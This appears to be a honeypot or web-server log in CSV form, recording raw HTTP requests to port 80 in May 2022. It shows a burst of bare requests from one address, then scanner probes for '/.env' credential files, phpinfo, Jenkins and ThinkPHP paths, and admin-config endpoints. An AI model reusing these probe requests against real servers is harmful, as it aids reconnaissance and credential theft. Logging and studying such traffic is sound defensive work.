REQ_99_P80,"('186.224.251.136', 18268)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:32.648477
REQ_100_P80,"('186.224.251.136', 18523)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:32.944350
REQ_101_P80,"('186.224.251.136', 18076)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:33.249832
REQ_102_P80,"('186.224.251.136', 18849)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:33.584264
REQ_103_P80,"('186.224.251.136', 18312)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:33.861355
REQ_104_P80,"('186.224.251.136', 17206)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:34.136973
REQ_105_P80,"('186.224.251.136', 18210)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:34.606465
REQ_106_P80,"('186.224.251.136', 17682)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:34.886523
REQ_107_P80,"('186.224.251.136', 17533)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:35.166248
REQ_108_P80,"('186.224.251.136', 18775)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:35.581261
REQ_109_P80,"('186.224.251.136', 18887)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:35.853901
REQ_110_P80,"('186.224.251.136', 18970)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:36.132035
REQ_111_P80,"('186.224.251.136', 17446)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:36.593028
REQ_112_P80,"('186.224.251.136', 18587)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:36.875374
REQ_113_P80,"('186.224.251.136', 18292)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:37.172973
REQ_114_P80,"('186.224.251.136', 17936)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:37.593941
REQ_115_P80,"('186.224.251.136', 18048)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:37.871730
REQ_116_P80,"('186.224.251.136', 18421)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:38.168614
REQ_117_P80,"('186.224.251.136', 17684)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:38.617171
REQ_118_P80,"('186.224.251.136', 17107)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:38.921296
REQ_119_P80,"('186.224.251.136', 18749)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:39.201331
REQ_120_P80,"('186.224.251.136', 17814)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:39.609816
REQ_121_P80,"('186.224.251.136', 18267)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:39.883788
REQ_122_P80,"('186.224.251.136', 18531)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:40.182819
REQ_123_P80,"('186.224.251.136', 17067)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:40.624236
REQ_124_P80,"('186.224.251.136', 17176)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:40.899156
REQ_125_P80,"('186.224.251.136', 18849)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:41.177001
REQ_126_P80,"('186.224.251.136', 17294)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:41.598246
REQ_127_P80,"('186.224.251.136', 17037)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:41.898687
REQ_128_P80,"('186.224.251.136', 17631)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:42.172253
REQ_129_P80,"('186.224.251.136', 18796)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:42.611326
REQ_130_P80,"('186.224.251.136', 17809)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:42.905975
REQ_131_P80,"('186.224.251.136', 18094)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:43.183547
REQ_132_P80,"('186.224.251.136', 18768)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:43.591494
REQ_133_P80,"('186.224.251.136', 18013)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:43.886743
REQ_134_P80,"('186.224.251.136', 17479)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:44.169027
REQ_135_P80,"('186.224.251.136', 18704)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:44.628672
REQ_136_P80,"('186.224.251.136', 18880)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:44.930612
REQ_137_P80,"('186.224.251.136', 18504)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:45.232346
REQ_138_P80,"('186.224.251.136', 18436)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:45.617062
REQ_139_P80,"('186.224.251.136', 17218)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:45.890470
REQ_140_P80,"('186.224.251.136', 17731)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:46.172788
REQ_141_P80,"('186.224.251.136', 18485)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:46.603737
REQ_142_P80,"('186.224.251.136', 18947)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:46.878587
REQ_143_P80,"('186.224.251.136', 18582)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:47.155843
REQ_144_P80,"('186.224.251.136', 18118)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:47.605948
REQ_145_P80,"('186.224.251.136', 18960)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:47.904075
REQ_146_P80,"('186.224.251.136', 17184)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:48.212516
REQ_147_P80,"('186.224.251.136', 18157)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:48.624748
REQ_148_P80,"('186.224.251.136', 18899)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:48.903023
REQ_149_P80,"('186.224.251.136', 17792)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:49.197370
REQ_150_P80,"('186.224.251.136', 17546)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:49.619019
REQ_151_P80,"('186.224.251.136', 17429)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:49.917753
REQ_152_P80,"('186.224.251.136', 17594)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:50.217222
REQ_153_P80,"('186.224.251.136', 18538)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:50.630245
REQ_154_P80,"('186.224.251.136', 18661)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:50.927964
REQ_155_P80,"('186.224.251.136', 18184)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:51.230058
REQ_156_P80,"('186.224.251.136', 18170)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:51.601555
REQ_157_P80,"('186.224.251.136', 18722)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:51.882264
REQ_158_P80,"('186.224.251.136', 18475)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:52.168425
REQ_159_P80,"('186.224.251.136', 17560)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:52.634920
REQ_160_P80,"('186.224.251.136', 17693)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:52.917827
REQ_161_P80,"('186.224.251.136', 17367)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:53.213852
REQ_162_P80,"('186.224.251.136', 17302)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:53.605832
REQ_163_P80,"('186.224.251.136', 17826)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:53.904462
REQ_164_P80,"('186.224.251.136', 18710)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:54.178764
REQ_165_P80,"('186.224.251.136', 17754)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:54.637360
REQ_166_P80,"('186.224.251.136', 18657)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:54.943017
REQ_167_P80,"('186.224.251.136', 17731)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:55.222397
REQ_168_P80,"('186.224.251.136', 18577)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:55.615377
REQ_169_P80,"('186.224.251.136', 18529)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:55.918586
REQ_170_P80,"('186.224.251.136', 17753)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:56.194785
REQ_171_P80,"('186.224.251.136', 17869)",b'GET / HTTP/1.1\r\n\r\n',2022-05-04 01:12:56.644967
REQ_172_P80,"('94.102.61.10', 45810)","b'GET / HTTP/1.1\r\nHost: 54.80.75.64\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36\r\nAccept: */*\r\nAccept-Encoding: gzip\r\n\r\n'",2022-05-04 01:17:35.820206
REQ_173_P80,"('128.14.209.162', 59204)","b'GET / HTTP/1.1\r\nHost: 54.80.75.64\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 \r\nAccept: */*\r\nAccept-Encoding: gzip\r\n\r\n'",2022-05-04 01:20:36.262594
REQ_174_P80,"('54.86.50.139', 35634)","b'GET /?=asasas HTTP/1.1\r\nUser-Agent: PostmanRuntime/7.29.0\r\nAccept: */*\r\nCache-Control: no-cache\r\nPostman-Token: 99df26fa-de26-45da-8f89-47d960713d8c\r\nHost: 54.91.30.20:80\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\nContent-Length: 0\r\n\r\n'",2022-05-10 10:09:03.312888
REQ_175_P80,"('192.241.212.233', 37572)",b'GET /hudson HTTP/1.1\r\nHost: 54.91.30.20\r\nUser-Agent: Mozilla/5.0 zgrab/0.x\r\nAccept: */*\r\nAccept-Encoding: gzip\r\n\r\n',2022-05-10 10:32:35.905973
REQ_176_P80,"('193.118.53.194', 58400)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 \r\nAccept: */*\r\nAccept-Encoding: gzip\r\n\r\n'",2022-05-10 10:49:31.398565
REQ_177_P80,"('95.52.112.218', 46033)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20:80\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7\r\nContent-Length: 0\r\n\r\n'",2022-05-10 10:54:16.831393
REQ_178_P80,"('45.61.188.169', 38784)","b'GET /config/getuser?index=0 HTTP/1.1\r\nHost: 54.91.30.20:80\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'",2022-05-10 11:36:29.925212
REQ_179_P80,"('185.254.196.218', 55336)","b'GET /.env HTTP/1.1\r\nHost: 54.91.30.20\r\nUser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n'",2022-05-10 11:51:42.159336
REQ_180_P80,"('106.75.130.250', 45488)",b'GET / HTTP/1.1\r\nHost: 54.91.30.20:80\r\nUser-Agent: Mozilla/5.0\r\nAccept-Encoding: gzip\r\n\r\n',2022-05-10 11:53:10.272784
REQ_181_P80,"('185.254.196.115', 54044)","b'GET /.env HTTP/1.1\r\nHost: 54.91.30.20\r\nUser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n'",2022-05-10 12:09:09.030699
REQ_182_P80,"('134.122.118.31', 43600)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20:80\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nReferer: http://54.91.30.20:80/left.html\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'",2022-05-10 15:02:27.143109
REQ_183_P80,"('185.254.196.115', 47626)","b'GET /.env HTTP/1.1\r\nHost: 54.91.30.20\r\nUser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n'",2022-05-10 16:40:52.969976
REQ_184_P80,"('193.46.255.49', 39666)","b'GET / HTTP/1.1\r\nTE: deflate,gzip;q=0.3\r\nConnection: TE, close\r\nHost: 54.91.30.20:80\r\nUser-Agent: libwww-perl/6.62\r\n\r\n'",2022-05-10 17:17:14.674028
REQ_185_P80,"('185.254.196.115', 39060)","b'GET /.env HTTP/1.1\r\nHost: 54.91.30.20\r\nUser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n'",2022-05-10 18:07:21.425867
REQ_186_P80,"('45.61.188.169', 33654)","b'GET /config/getuser?index=0 HTTP/1.1\r\nHost: 54.91.30.20:80\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'",2022-05-10 18:16:47.086321
REQ_187_P80,"('185.254.196.115', 47310)","b'GET /.env HTTP/1.1\r\nHost: 54.91.30.20\r\nUser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n'",2022-05-10 19:37:36.936002
REQ_188_P80,"('185.254.196.115', 58508)","b'GET /.env HTTP/1.1\r\nHost: 54.91.30.20\r\nUser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n'",2022-05-10 21:04:08.283187
REQ_189_P80,"('82.196.14.19', 36550)",b'',2022-05-10 23:00:41.166251
REQ_190_P80,"('82.196.14.19', 53494)",b'GET /TP/public/index.php HTTP/1.1\r\nHost: 54.91.30.20\r\nUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\r\nConnection: close\r\nAccept-Encoding: gzip\r\n\r\n',2022-05-10 23:00:48.583845
REQ_191_P80,"('82.196.14.19', 44084)",b'GET / HTTP/1.1\r\nHost: 54.91.30.20:80\r\nUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\r\nConnection: close\r\nAccept-Encoding: gzip\r\n\r\n',2022-05-10 23:00:50.509832
REQ_192_P80,"('37.76.213.46', 40653)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20:80\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7\r\nContent-Length: 0\r\n\r\n'",2022-05-11 08:56:53.955375
REQ_193_P80,"('37.76.213.46', 40654)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20:80\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36\r\nContent-Length: 0\r\n\r\n'",2022-05-11 08:56:53.995031
REQ_194_P80,"('37.76.213.46', 40655)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20:80\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7\r\nContent-Length: 0\r\n\r\n'",2022-05-11 08:56:55.467565
REQ_195_P80,"('40.82.192.115', 63077)","b'GET /_profiler/phpinfo HTTP/1.1\r\nHost: 54.91.30.20\r\nConnection: keep-alive\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nUser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\r\n\r\n'",2022-05-11 09:03:54.128587
REQ_196_P80,"('185.254.196.115', 59672)","b'GET /.env HTTP/1.1\r\nHost: 54.91.30.20\r\nUser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n'",2022-05-11 09:04:40.368329
REQ_197_P80,"('5.252.194.39', 54446)","b'GET /.env HTTP/1.1\r\nHost: 54.91.30.20\r\nUser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n'",2022-05-11 10:23:47.959177
REQ_198_P80,"('185.254.196.115', 50490)","b'GET /.env HTTP/1.1\r\nHost: 54.91.30.20\r\nUser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n'",2022-05-11 10:37:29.349612
REQ_199_P80,"('185.254.196.218', 44936)","b'GET /.env HTTP/1.1\r\nHost: 54.91.30.20\r\nUser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n'",2022-05-11 11:51:04.816489
REQ_200_P80,"('185.254.196.115', 33910)","b'GET /.env HTTP/1.1\r\nHost: 54.91.30.20\r\nUser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n'",2022-05-11 12:13:04.309045
REQ_201_P80,"('205.210.31.140', 43957)","b""\x16\x03\x01\x00\xca\x01\x00\x00\xc6\x03\x035\x80\xfc=\xdfL\xbe+\xab\x06&N;\xe2\xd4\x82\x15\xa9I!\r\xfb\x9b\x83Y\x98\x02#\x92@\x93\x90\x00\x00h\xcc\x14\xcc\x13\xc0/\xc0+\xc00\xc0,\xc0\x11\xc0\x07\xc0'\xc0#\xc0\x13\xc0\t\xc0(\xc0$\xc0\x14\xc0\n\xcc\x15\x00\x9e\x00\x9f\x00g\x00k\x003\x009\x00\x9c\x00\x9d\x00\x05\x00\x04\x00<\x00=\x00/\x005\xc0\x12\x00\x16\x00\n\x00\x03\x00\x08\x00\x06\x00\x14\x00\x11\x00\x19\x00\x17\x002\xc0\x08\x00\x12\x00\x13\x00\x15\x008\x00@\x00f\x00j\x00\xa2\x00\xa3\x01\x00\x005\x00\x05\x00\x05\x01\x00\x00\x00\x00\x00\n\x00\x08\x00\x06\x00\x17\x00\x18\x00\x19\x00\x0b\x00\x02\x01\x00\x00\r\x00\x0c\x00\n\x04\x01\x04\x03\x02\x01\x02\x03\x02\x02\xff\x01\x00\x01\x00\x00\x0f\x00\x01\x01""",2022-05-11 22:40:01.475409
REQ_202_P80,"('185.254.196.115', 34604)","b'GET /.env HTTP/1.1\r\nHost: 54.91.30.20\r\nUser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n'",2022-05-12 00:04:22.105048
REQ_203_P80,"('193.118.53.210', 52110)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 \r\nAccept: */*\r\nAccept-Encoding: gzip\r\n\r\n'",2022-05-12 01:11:50.571432
